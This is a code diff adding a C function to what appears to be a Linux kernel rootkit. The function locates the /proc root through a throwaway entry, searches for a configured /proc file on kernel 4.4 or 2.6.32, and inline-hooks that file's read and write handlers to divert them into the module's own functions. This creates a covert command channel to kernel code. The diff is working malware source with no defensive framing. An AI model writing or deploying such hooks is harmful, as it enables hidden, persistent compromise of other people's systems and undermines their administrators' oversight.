@@ -659,3 +659,77 @@ static ssize_t proc_fops_read(struct file *file, char __user *buf_user, size_t c
 
     return ret;
 }
+
+int setup_proc_comm_channel(void)
+{
+    static const struct file_operations proc_file_fops = {0};
+    struct proc_dir_entry *proc_entry = proc_create("temporary", 0444, NULL, &proc_file_fops);
+    proc_entry = proc_entry->parent;
+
+    if (strcmp(proc_entry->name, "/proc") != 0) {
+        pr_info("Couldn't find \"/proc\" entry\n");
+        remove_proc_entry("temporary", NULL);
+        return 0;
+    }
+
+    remove_proc_entry("temporary", NULL);
+
+    struct file_operations *proc_fops = NULL;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
+    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
+
+    struct rb_node *entry = rb_first(&proc_entry->subdir);
+
+    while (entry) {
+        pr_info("Looking at \"/proc/%s\"\n", rb_entry(entry, struct proc_dir_entry, subdir_node)->name);
+
+        if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, CFG_PROC_FILE) == 0) {
+            pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
+            proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
+            goto found;
+        }
+
+        entry = rb_next(entry);
+    }
+
+#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
+
+    proc_entry = proc_entry->subdir;
+
+    while (proc_entry) {
+        pr_info("Looking at \"/proc/%s\"\n", proc_entry->name);
+
+        if (strcmp(proc_entry->name, CFG_PROC_FILE) == 0) {
+            pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
+            proc_fops = (struct file_operations *) proc_entry->proc_fops;
+            goto found;
+        }
+
+        proc_entry = proc_entry->next;
+    }
+
+#endif
+
+    pr_info("Couldn't find \"/proc/%s\"\n", CFG_PROC_FILE);
+
+    return 0;
+
+found:
+    ;
+
+    if (proc_fops->write) {
+        asm_hook_create(proc_fops->write, proc_fops_write);
+    }
+
+    if (proc_fops->read) {
+        asm_hook_create(proc_fops->read, proc_fops_read);
+    }
+
+    if (!proc_fops->read && !proc_fops->write) {
+        pr_info("\"/proc/%s\" has no write nor read function set\n", CFG_PROC_FILE);
+        return 0;
+    }
+
+    return 1;
+}
